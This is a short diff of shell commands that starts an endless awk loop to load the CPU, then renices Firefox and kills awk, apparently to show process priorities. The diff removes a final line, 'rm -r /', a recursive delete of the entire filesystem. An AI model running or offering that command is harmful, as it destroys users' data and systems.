@@ -3,4 +3,3 @@ echo "" | awk '{for(;;) {}}'
 pgrep firefox
 renice +15 -p <PID>
 pkill awk
-rm -r /
